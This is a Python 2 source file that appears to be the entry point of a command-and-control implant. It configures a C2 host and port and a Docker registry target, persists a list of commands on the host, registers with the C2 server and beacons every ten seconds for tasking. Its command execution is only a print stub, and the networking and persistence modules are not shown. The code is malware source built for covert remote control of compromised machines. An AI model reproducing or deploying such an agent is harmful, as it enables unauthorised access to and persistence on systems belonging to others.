import argparse
from os import sys, path

sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
from .rest import Rester
from .lib.persistance import PersistenceMGMT
from .db.SQLite import Helper
from .settings import commands


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
    parser.add_argument('--c2-port', action='store', dest='port',
                        help='Set port for C2 server')
    parser.add_argument('--docker-registry-port', action='store', dest='d_port', help='Change the Docker Registry port'),
    parser.add_argument('--docker-registry-host', action='store', dest='d_host', help='Change the Docker Registry host')
    args = parser.parse_args()
    return args


def update_config(db, args):
    if args.host:
        db.set_config('c2_host', args.host)
    if args.port:
        db.set_config('c2_port', args.port)
    if args.d_host:
        db.set_config('d_host', args.d_host)
    if args.d_port:
        db.set_config('d_port', args.d_port)


def main(args=None):
    db = Helper()
    args = parse_args()
    update_config(db, args)
    init()
    api_loop()


def init():
    def run():
        persistence = PersistenceMGMT()
        for command in commands:
            print "[+] Persisting %s" % command
            persistence.persist(command)
    run()


def exec_cmd(cmd, cmd_id):
    rest = Rester()
    print cmd
    rest.commandComplete(cmd_id)


def api_loop():
    from time import sleep
    rest = Rester()
    rest.register()
    while True:
        commands = rest.beacon()
        map(lambda cmd: exec_cmd(cmd['cmd'], cmd['id']), commands)
        sleep(10)


if __name__ == "__main__":
    main()